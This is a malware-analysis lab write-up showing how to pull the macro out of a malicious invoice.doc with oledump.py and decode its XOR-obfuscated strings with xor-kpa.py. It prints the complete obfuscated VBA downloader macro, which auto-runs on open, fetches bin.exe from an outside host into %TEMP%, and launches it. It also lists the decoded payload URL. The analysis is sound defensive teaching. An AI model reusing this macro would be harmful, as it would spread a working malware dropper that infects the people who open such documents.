# Lab 3.10: Examing invoice.doc using oledump.py and xor-kpa.py

- [Lab 3.10: Examing invoice.doc using oledump.py and xor-kpa.py](#lab-310-examing-invoicedoc-using-oledumppy-and-xor-kpapy)
  - [Objectives](#objectives)
  - [Steps](#steps)
  - [1 - Use oledump.py to extract macros from invoice.doc](#1---use-oledumppy-to-extract-macros-from-invoicedoc)
  - [2 - Examine invoice.txt](#2---examine-invoicetxt)
  - [3 - Use xor-kpa.py to deobfuscated the strings from invoice.txt](#3---use-xor-kpapy-to-deobfuscated-the-strings-from-invoicetxt)
  - [4 - Use plugin_http_heuristics plugin for oledump.py to extract the obfuscated URL from invoice.doc](#4---use-plugin_http_heuristics-plugin-for-oledumppy-to-extract-the-obfuscated-url-from-invoicedoc)

---

## Objectives

- Reinforce the use of oledump.py to extract macros from Microsoft Office documents.
- Start gaining experience analyzing obfuscated Microsoft Office macros.
- Learn how to use `xor‐kpa.py` to handle some XOR‐based obfuscation algorithms.

<br/>

---

## Steps

1. Use `oledump.py` to extract macros from `invoice.doc` to the `invoice.txt` file.
2. Examine `invoice.txt` to get a general sense of the macro's capabilities.
3. Use `xor‐kpa.py` to deobfuscate the strings from `invoice.txt` that the macro decodes via the XORI function.
4. Use the **plugin_http_heuristics** plugin for `oledump.py` to automatically extract the
obfuscated URL from the `invoice.doc` macro.

<br/>

---

## 1 - Use oledump.py to extract macros from invoice.doc

```
unzip invoice.zip -d invoice; cd invoice; ls
```

![picture 296](../images/cace615e1b1ae51f143052dd70ee9df1a512a31cae4dd46fe4ecb84e8a6331bb.png)  

<br/>

Use `oledump.py` to list the streams of the document:

```
oledump.py invoice.doc 
```

![picture 297](../images/89f788dcb32111096fef18234e8f4d655e57ac93fc974153472de13d60489376.png)  

- The macro is in stream 7

<br/>

Dump stream 7 out:

```
oledump.py invoice.doc -s 7 -v > invoice.txt
```

<br/>

---

## 2 - Examine invoice.txt

- The extracted content:

```
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Public Function XORI(ByVal xicjMaZpt As String, ByVal nMcTEmoJm As String) As String
Dim EOjxkQxT As Long
For EOjxkQxT = 1 To Len(xicjMaZpt)

Dim QctTVICL As Integer
Dim cFPFIYBU As Integer
For cFPFIYBU = 0 To 6
DoEvents
Next cFPFIYBU
QctTVICL = 7
Do While QctTVICL < 28
Dim StdTGllU As Integer
For StdTGllU = 0 To 9
DoEvents
Next StdTGllU
DoEvents: QctTVICL = QctTVICL + 1
Dim xMqFiUle As Integer
For xMqFiUle = 0 To 3
DoEvents
Next xMqFiUle
Loop

Dim QqSTgmDe As Integer
For QqSTgmDe = 0 To 5
DoEvents
Next QqSTgmDe
XORI = XORI & Chr(Asc(Mid(nMcTEmoJm, IIf(EOjxkQxT Mod Len(nMcTEmoJm) <> 0, EOjxkQxT Mod Len(nMcTEmoJm), Len(nMcTEmoJm)), 1)) Xor Asc(Mid(xicjMaZpt, EOjxkQxT, 1)))
Next EOjxkQxT
End Function
Public Function Hextostring(ByVal cJbMQrQcVo As String) As String
Dim IeCvrCT As String
Dim DrBZTx As String
Dim fzEMCirrqv As Long
For fzEMCirrqv = 1 To Len(cJbMQrQcVo) Step 2

Dim RhqhLzTZ As Integer
Dim muelWLmV As Integer
For muelWLmV = 0 To 9
DoEvents
Next muelWLmV
RhqhLzTZ = 4
Do While RhqhLzTZ < 97
Dim qfCHorOw As Integer
For qfCHorOw = 0 To 1
DoEvents
Next qfCHorOw
DoEvents: RhqhLzTZ = RhqhLzTZ + 1
Dim BRaAsjQK As Integer
For BRaAsjQK = 0 To 2
DoEvents
Next BRaAsjQK
Loop

Dim GQWNnAah As Integer
For GQWNnAah = 0 To 9
DoEvents
Next GQWNnAah
IeCvrCT = Chr$(Val(Chr$(38) & Chr$(72) & Mid$(cJbMQrQcVo, fzEMCirrqv, 2)))

Dim AUPhkyFG As Integer
Dim TVkstGBa As Integer
For TVkstGBa = 0 To 4
DoEvents
Next TVkstGBa
AUPhkyFG = 6
Do While AUPhkyFG < 53
Dim HIpHCYEy As Integer
For HIpHCYEy = 0 To 6
DoEvents
Next HIpHCYEy
DoEvents: AUPhkyFG = AUPhkyFG + 1
Dim XNutKALo As Integer
For XNutKALo = 0 To 4
DoEvents
Next XNutKALo
Loop

Dim vSKdZNQW As Integer
For vSKdZNQW = 0 To 9
DoEvents
Next vSKdZNQW
DrBZTx = DrBZTx & IeCvrCT
Next fzEMCirrqv

Dim giWnjmfl As Integer
Dim wBGkwCdq As Integer
For wBGkwCdq = 0 To 6
DoEvents
Next wBGkwCdq
giWnjmfl = 1
Do While giWnjmfl < 14
Dim FJcQsIId As Integer
For FJcQsIId = 0 To 9
DoEvents
Next FJcQsIId
DoEvents: giWnjmfl = giWnjmfl + 1
Dim MolNiEVg As Integer
For MolNiEVg = 0 To 7
DoEvents
Next MolNiEVg
Loop

Dim yLsRBlZm As Integer
For yLsRBlZm = 0 To 9
DoEvents
Next yLsRBlZm
Hextostring = DrBZTx
End Function


Sub Auto_Open()
GoTo ruasvvfhdwnyfwvlyfvgzypqhlekgukmiiwqldehkfvillpnmacqzbvelbbelgjnjtrnwxumtmyukdhajyahmxun:
ruasvvfhdwnyfwvlyfvgzypqhlekgukmiiwqldehkfvillpnmacqzbvelbbelgjnjtrnwxumtmyukdhajyahmxun:
GoTo ujhlspviumyqspsnpkgjcpopcahbdbubpeqcpjwqwcgxdschcazspjqugvdfpgoatoiffvfxjxcqcylpyftitwte:
ujhlspviumyqspsnpkgjcpopcahbdbubpeqcpjwqwcgxdschcazspjqugvdfpgoatoiffvfxjxcqcylpyftitwte:
GoTo aqynxlaxpejjbqwicohawxriwtthajvyxqqvvoqtgjlxjireadncagbxorhrfbsccvsrscrhmkvdeourvcszwevi:
aqynxlaxpejjbqwicohawxriwtthajvyxqqvvoqtgjlxjireadncagbxorhrfbsccvsrscrhmkvdeourvcszwevi:
GDABRYXEKTS
End Sub
Sub AutoOpen()
GoTo yyccrzpgxbfwprorphpzmwkoyffolpcrrxwtaggibqynvnrgdyndpbifodaqmhicshyzkxjrmswlicexsrxbjhvh:
yyccrzpgxbfwprorphpzmwkoyffolpcrrxwtaggibqynvnrgdyndpbifodaqmhicshyzkxjrmswlicexsrxbjhvh:
GoTo ojafiiwikrzjoxvdcwavsykagcbkjmfwtuqmwqfzmsvsiourbuvxokfktshdqhsbllznavxkpvodfjyeqsklxczp:
ojafiiwikrzjoxvdcwavsykagcbkjmfwtuqmwqfzmsvsiourbuvxokfktshdqhsbllznavxkpvodfjyeqsklxczp:
GoTo dlqpwhyxwnefrwhcnxsiiidnzkhugqwsitqayzdbzrasxkjpfosymgorsolexnwpiyfkncgpeqpczqchopcepvdv:
dlqpwhyxwnefrwhcnxsiiidnzkhugqwsitqayzdbzrasxkjpfosymgorsolexnwpiyfkncgpeqpczqchopcepvdv:
    Auto_Open
End Sub
Sub Workbook_Open()
GoTo iyiudojgrwlkltrockyqgjbnbbxsrxqnlnwopjbarujhwujehfsvonwcakflikapvvoyfxbmrfkdmtotvqyuyidr:
iyiudojgrwlkltrockyqgjbnbbxsrxqnlnwopjbarujhwujehfsvonwcakflikapvvoyfxbmrfkdmtotvqyuyidr:
GoTo xjcbjynummnfjcoknrvrjwvktuyoedovqzqddecgukylhlqpagmyiknmvjqaajexfaczvvecgntvrmxhgnsadjmn:
xjcbjynummnfjcoknrvrjwvktuyoedovqzqddecgukylhlqpagmyiknmvjqaajexfaczvvecgntvrmxhgnsadjmn:
GoTo glgrafdzdeiadraasvbjcrojddvmlentroqfjcclqppqlbanjhglngrgwvewemxurhhdxcchbeuudsdmriufmklf:
glgrafdzdeiadraasvbjcrojddvmlentroqfjcclqppqlbanjhglngrgwvewemxurhhdxcchbeuudsdmriufmklf:
    Auto_Open
End Sub
Function VYXQPXIETSZ(ByVal KWIDOJJHRJD As String, ByVal ZPKYKPAZRNC As String) As Boolean
     Dim UICEAIAVFZZ As Object, YKGKMJIBROC As Long, SYHFRMSETBM As Long, HCABKIAGVDD() As Byte

GoTo ujhlspviumyqspsnpkgjcpopcahbdbubpeqcpjwqwcgxdschcazspjqugvdfpgoatoiffvfxjxcqcylpyftitwte:
ujhlspviumyqspsnpkgjcpopcahbdbubpeqcpjwqwcgxdschcazspjqugvdfpgoatoiffvfxjxcqcylpyftitwte:
GoTo aqynxlaxpejjbqwicohawxriwtthajvyxqqvvoqtgjlxjireadncagbxorhrfbsccvsrscrhmkvdeourvcszwevi:
aqynxlaxpejjbqwicohawxriwtthajvyxqqvvoqtgjlxjireadncagbxorhrfbsccvsrscrhmkvdeourvcszwevi:
GoTo webyybgnxnmfpmzlndhxmvkummctbifjbkwbmsqonirxqjfphgfuksemhdkvyiwigsecmcvuoxncsxbjgtuvkrhc:
webyybgnxnmfpmzlndhxmvkummctbifjbkwbmsqonirxqjfphgfuksemhdkvyiwigsecmcvuoxncsxbjgtuvkrhc:
    Set UICEAIAVFZZ = CreateObject(XORI(Hextostring("2B07372B185D480C222A1C3B3204"), Hextostring("66546F")))
GoTo ctjfktlfbeoatidssrjyyndyurfcxmwbmjwnfelcpsixtcxnejklummgzpwhnqzerjcgvxjawkmuobgatgfagrym:
ctjfktlfbeoatidssrjyyndyurfcxmwbmjwnfelcpsixtcxnejklummgzpwhnqzerjcgvxjawkmuobgatgfagrym:
GoTo nheerqsywmkvenkohiyoidsvhgbezkzcsslqtikmcznbkybhjkjsylrquiunllgtzwmwivxcfdjqgqkpxziwpder:
nheerqsywmkvenkohiyoidsvhgbezkzcsslqtikmcznbkybhjkjsylrquiunllgtzwmwivxcfdjqgqkpxziwpder:
GoTo qkxahmhprrazkyiqlsuehgvcxohziiargmqwiajfugdbegyerqwxvhaydjpkzsyqduwptcfjcykdxrurdegyufxo:
qkxahmhprrazkyiqlsuehgvcxohziiargmqwiajfugdbegyerqwxvhaydjpkzsyqduwptcfjcykdxrurdegyufxo:
    UICEAIAVFZZ.Open XORI(Hextostring("122F20"), Hextostring("556A74")), KWIDOJJHRJD, False
GoTo zwfimyqvunpidhmdeeihcjoxqftstmkfjbqezwhkqyjbuzhpoeuyffyzivcigxbgwxxsectoyslcwuvjedporgfv:
zwfimyqvunpidhmdeeihcjoxqftstmkfjbqezwhkqyjbuzhpoeuyffyzivcigxbgwxxsectoyslcwuvjedporgfv:
GoTo frrjpgtapewtbclxycomwlrpnicqelycqcwrbxhefnwnpqcnbrxlwadnfrbaytkmzmgwqcvskyquapfazxjxqgra:
frrjpgtapewtbclxycomwlrpnicqelycqcwrbxhefnwnpqcnbrxlwadnfrbaytkmzmgwqcvskyquapfazxjxqgra:
GoTo yyccrzpgxbfwprorphpzmwkoyffolpcrrxwtaggibqynvnrgdyndpbifodaqmhicshyzkxjrmswlicexsrxbjhvh:
yyccrzpgxbfwprorphpzmwkoyffolpcrrxwtaggibqynvnrgdyndpbifodaqmhicshyzkxjrmswlicexsrxbjhvh:
    UICEAIAVFZZ.Send XORI(Hextostring("152D2404270A0924"), Hextostring("634F42"))
GoTo ojafiiwikrzjoxvdcwavsykagcbkjmfwtuqmwqfzmsvsiourbuvxokfktshdqhsbllznavxkpvodfjyeqsklxczp:
ojafiiwikrzjoxvdcwavsykagcbkjmfwtuqmwqfzmsvsiourbuvxokfktshdqhsbllznavxkpvodfjyeqsklxczp:
GoTo dlqpwhyxwnefrwhcnxsiiidnzkhugqwsitqayzdbzrasxkjpfosymgorsolexnwpiyfkncgpeqpczqchopcepvdv:
dlqpwhyxwnefrwhcnxsiiidnzkhugqwsitqayzdbzrasxkjpfosymgorsolexnwpiyfkncgpeqpczqchopcepvdv:
GoTo replfcpnregaksytsgdwhpvblxrbspopzewsofsdyvgsnvbnlzjljdhoykexhoxtmzticctffvxuqrfmmwqyubes:
replfcpnregaksytsgdwhpvblxrbspopzewsofsdyvgsnvbnlzjljdhoykexhoxtmzticctffvxuqrfmmwqyubes:
    HCABKIAGVDD = UICEAIAVFZZ.responseBody

GoTo cqnwurbckebtojxjytrcadkspngeodcidsqurrnpnxnhfwnnxmpldflemdnucckshrvvlcggafguzkdmjarqxuqd:
cqnwurbckebtojxjytrcadkspngeodcidsqurrnpnxnhfwnnxmpldflemdnucckshrvvlcggafguzkdmjarqxuqd:
GoTo jrkalddawnuwtbfmpbtuugdakwrzuedkhmwiuvbvpgdhkmuhasbdqavitosnhyivyojhhcyuzihlqwwzyparouzk:
jrkalddawnuwtbfmpbtuugdakwrzuedkhmwiuvbvpgdhkmuhasbdqavitosnhyivyojhhcyuzihlqwwzyparouzk:
GoTo iyiudojgrwlkltrockyqgjbnbbxsrxqnlnwopjbarujhwujehfsvonwcakflikapvvoyfxbmrfkdmtotvqyuyidr:
iyiudojgrwlkltrockyqgjbnbbxsrxqnlnwopjbarujhwujehfsvonwcakflikapvvoyfxbmrfkdmtotvqyuyidr:
    SYHFRMSETBM = FreeFile

    Open ZPKYKPAZRNC For Binary As #SYHFRMSETBM
    Put #SYHFRMSETBM, , HCABKIAGVDD
    Close #SYHFRMSETBM
GoTo sroedjmsmnjolxtuezcwgrbwicfmkjaltowqhprstppigpdoxnouraljxkxsbrbdbldurchyxrtcoabjnbrdszjx:
sroedjmsmnjolxtuezcwgrbwicfmkjaltowqhprstppigpdoxnouraljxkxsbrbdbldurchyxrtcoabjnbrdszjx:
GoTo ruasvvfhdwnyfwvlyfvgzypqhlekgukmiiwqldehkfvillpnmacqzbvelbbelgjnjtrnwxumtmyukdhajyahmxun:
ruasvvfhdwnyfwvlyfvgzypqhlekgukmiiwqldehkfvillpnmacqzbvelbbelgjnjtrnwxumtmyukdhajyahmxun:
GoTo lvaarmwbaarlhwvcpseulxvdcjohfcogolkjmswlpfqbzgkjemtmepqurhhriepjruwambkhjdsqpbfitarbfasp:
lvaarmwbaarlhwvcpseulxvdcjohfcogolkjmswlpfqbzgkjemtmepqurhhriepjruwambkhjdsqpbfitarbfasp:
    
GoTo znqihuysdtghaahycrrqbvisezmtshnczkkkdeqrrytbvxnrisozpibxaxkvsgddxxxqvbounudflaewcpaasswb:
znqihuysdtghaahycrrqbvisezmtshnczkkkdeqrrytbvxnrisozpibxaxkvsgddxxxqvbounudflaewcpaasswb:
GoTo fspjmgpjhavdcoyjnvtfrnemahkcnyhrvhlljclijnobaquzcfvtmtemtwwhrbebfahpxvsaodfvnfpggqygnszd:
fspjmgpjhavdcoyjnvtfrnemahkcnyhrvhlljclijnobaquzcfvtmtemtwwhrbebfahpxvsaodfvnfpggqygnszd:
GoTo yfscpxbwkrumiknndjybsajnupufcbrgmflqqhkxaqcbgmjmshskkwngsatybicpehuspvwewuguyjanrsdkcddk:
yfscpxbwkrumiknndjybsajnupufcbrgmflqqhkxaqcbgmjmshskkwngsatybicpehuspvwewuguyjanrsdkcddk:
Set GBIviviu67FUGBK = CreateObject(XORI(Hextostring("29240416204F3B3C111625021B38081522"), Hextostring("7A4C61")))
GoTo ocjfbiuccshcuudyhwvafgjkhwqzxhxsanjxzwjnfsfanpqjvjmmjxrlbmpkjujxpqzkebnjfqeqspfiziuoqpmz:
ocjfbiuccshcuudyhwvafgjkhwqzxhxsanjxzwjnfsfanpqjvjmmjxrlbmpkjujxpqzkebnjfqeqspfiziuoqpmz:
GoTo dbupijzmbtbpwjeklcbxpjshcbosoyszfvkcbxjdbrkadkatdkgzyoateucioluiayfuqblocvrfocwwdlfcjzln:
dbupijzmbtbpwjeklcbxpjshcbosoyszfvkcbxjdbrkadkatdkgzyoateucioluiayfuqblocvrfocwwdlfcjzln:
GoTo rmnlwcbfaaiuhvxmehbyklvgwqmqyblwjckvaghjoveahbozkqlrcuypnhbadsmeqzynkbosyqyvknpgwmonfzof:
rmnlwcbfaaiuhvxmehbyklvgwqmqyblwjckvaghjoveahbozkqlrcuypnhbadsmeqzynkbosyqyvknpgwmonfzof:
GBIviviu67FUGBK.Open Environ(XORI(Hextostring("391F2913"), Hextostring("6D5A6443716F69"))) & XORI(Hextostring("2406210B022E063F0B173F0C5F2A2D1D"), Hextostring("7854714F55"))
GoTo bdkbfedkdtlratgpuunlvwofmvkorkuslzlbfygeejusqrkmtetjfrdbrcaqtxljonnkgvsrkvuubsmnpohsaxsl:
bdkbfedkdtlratgpuunlvwofmvkorkuslzlbfygeejusqrkmtetjfrdbrcaqtxljonnkgvsrkvuubsmnpohsaxsl:
GoTo kgitbajehmaqvftwpmmderrsylumqivpeolnkmfuhopstdnhptpawqidmefpnrosaflidvebmqiqtfkosqzhbcwt:
kgitbajehmaqvftwpmmderrsylumqivpeolnkmfuhopstdnhptpawqidmefpnrosaflidvebmqiqtfkosqzhbcwt:
GoTo evcxsbnbptihxeoacgkhtiewgaluknhitrkqofdplqsgkcsttyipqzfjcwlekrdfkkrccbmppgbfsuwqlbjueekm:
evcxsbnbptihxeoacgkhtiewgaluknhitrkqofdplqsgkcsttyipqzfjcwlekrdfkkrccbmppgbfsuwqlbjueekm:
     
End Function
Sub GDABRYXEKTS()
GoTo msdozqikxatqiymvpoxndjjwlinsiqfygblavobcsrklbfsjiaiasrvucaflgcpfriadsvpmzneqjzhotumzlhku:
msdozqikxatqiymvpoxndjjwlinsiqfygblavobcsrklbfsjiaiasrvucaflgcpfriadsvpmzneqjzhotumzlhku:
GoTo qgektnxebrhjehlucdcpolsqbfjqtpwhkclsmsvmcbelspprcdcxqwwxqijouysncceemvdwrerdvvtevjtbhjiz:
qgektnxebrhjehlucdcpolsqbfjqtpwhkclsmsvmcbelspprcdcxqwwxqijouysncceemvdwrerdvvtevjtbhjiz:
GoTo tciyoctvwscdwtrhnjfxzrsptcameapflijtqjcfnuzececzidzrlzbnhuewntradmuopbihgjzvwkiffcakzvtj:
tciyoctvwscdwtrhnjfxzrsptcameapflijtqjcfnuzececzidzrlzbnhuewntradmuopbihgjzvwkiffcakzvtj:
VBkjbnlkBK = XORI(Hextostring("123E070240655C1B173A1600132B1F17142F0115036410135520005D18231D5C1F3216"), Hextostring("7A4A7372"))
GoTo bnmgewoattymhfcbdigylyvifllkqqmxeykyrixkpabrmarmvgnjiiefphyzqjcvwgmmibmibpxiawbbetyeibve:
bnmgewoattymhfcbdigylyvifllkqqmxeykyrixkpabrmarmvgnjiiefphyzqjcvwgmmibmibpxiawbbetyeibve:
GoTo lalxgacguajvaxgihahlbioupxiujzjeytkuiaxerwsrfifjsjdabymljcodxmhozqqltbqsihcqithoxgfytbhi:
lalxgacguajvaxgihahlbioupxiujzjeytkuiaxerwsrfifjsjdabymljcodxmhozqqltbqsihcqithoxgfytbhi:
GoTo pdoqnumlprnzcwyllejdrprtkknbgdtdielizwzijchrjhxrklkxhettzezrhpyrsyxoevzelpbdjiredvoownyx:
pdoqnumlprnzcwyllejdrprtkknbgdtdielizwzijchrjhxrklkxhettzezrhpyrsyxoevzelpbdjiredvoownyx:
    VYXQPXIETSZ VBkjbnlkBK, Environ(XORI(Hextostring("1D1C3F19"), Hextostring("495972"))) & XORI(Hextostring("39081E31141237140A37041C4B3F3610"), Hextostring("655A4E754344"))
End Sub

```

<br/>

Take a look at the content here:

![picture 298](../images/f1460e3e4963414eac2bb25ea17b0a3863307fd4adeaac1b9b78558498648cef.png)  

- Quite obfuscated
- Many `GoTo` statements
- The label looks randomized

<br/>

![picture 299](../images/474d188902264b6c9c4b0ed0dced2a3a4b640a625f4b49e005876dc51309e045.png)  

- Also we can see some method names as highlighted: `Open`, `Send` and `responseBody`
- This could be a sign of a Downloader

<br/>

The function `Hextostring` and `XORI` decode numerous strings that are embedded in the macro in Hex form.

A possibility is the macro uses `XORI` to decode obfuscated strings by XORing one string with the other.

<br/>

---

## 3 - Use xor-kpa.py to deobfuscated the strings from invoice.txt

The first occurrence of XORI function is here:

```
Set UICEAIAVFZZ = CreateObject(XORI(Hextostring("2B07372B185D480C222A1C3B3204"), Hextostring("66546F")))
```

- We can use `xor-kpa.py` and make an attempt to derive the key
  - `xor-kpa.py -x '#h#2B07372B185D480C222A1C3B3204' '#h#66546F'`

![picture 300](../images/a5d542d9f27b8e5587f83f35fb779bcbc2ae68116fb1a69fddf7836edb9d71fe.png)  

<br/>

Let's find out all of the occurrence of `Hextostring`:

```
cat invoice.txt | grep -P "XORI\(Hextostring.*?\)\)" -o > hexttostring.txt
```

<br/>

Then extract the 2 values in each line:

```
cat hextostring.txt | cut -d '"' -f 2,4 | sed "s/\"/ /g" > extract_para.txt
```

![picture 301](../images/ad324626e75a055b12da525314dbcfd1cebf42b66e15e94303b4be0d7dc81c51.png)  

<br/>

```
xor-kpa.py -x '#h#122F20' '#h#556A74' >> output.txt
remnux@remnux:~/malware/day3/invoice$ xor-kpa.py -x '#h#152D2404270A0924' '#h#634F42' >> output.txt
remnux@remnux:~/malware/day3/invoice$ xor-kpa.py -x '#h#29240416204F3B3C111625021B38081522' '#h#7A4C61' >> output.txt
remnux@remnux:~/malware/day3/invoice$ xor-kpa.py -x '#h#391F2913' '#h#6D5A6443716F69' >> output.txt
remnux@remnux:~/malware/day3/invoice$ xor-kpa.py -x '#h#2406210B022E063F0B173F0C5F2A2D1D' '#h#7854714F55' >> output.txt
remnux@remnux:~/malware/day3/invoice$ xor-kpa.py -x '#h#123E070240655C1B173A1600132B1F17142F0115036410135520005D18231D5C1F3216' '#h#7A4A7372' >> output.txt
remnux@remnux:~/malware/day3/invoice$ xor-kpa.py -x '#h#1D1C3F19' '#h#495972' >> output.txt
remnux@remnux:~/malware/day3/invoice$ xor-kpa.py -x '#h#39081E31141237140A37041C4B3F3610' '#h#655A4E754344' >> output.txt
```

<br/>

Check the output:

![picture 302](../images/aa00e970525adf565bbbb2f1880aafafc1ddde0a7a8ab73bf2c5dcd5c25c28a3.png)  

```
MSXML2.XML
HTTP
GET
vbfghHjk
Shell.Application
TEMP\RPDWVRNDBGX.exe
http://imperialenergy.ca/js/bin.exe
TEMP\RPDWVRNDBGX.exe
```

- The document acts like a Downloader
- Retrieve an executable from `imperialenergy.ca`
- Likely to save in `%TEMP%\RPDWVRNDBGX.exe`

<br/>

---

## 4 - Use plugin_http_heuristics plugin for oledump.py to extract the obfuscated URL from invoice.doc

```
oledump.py invoice.doc -p plugin_http_heuristics
```

![picture 303](../images/cdf640fa10d72aa8c0be31ce5f34d2b365b9311c8ab74b5e3f9c7657b777f403.png)  

- This is the same as we found manually

<br/>

---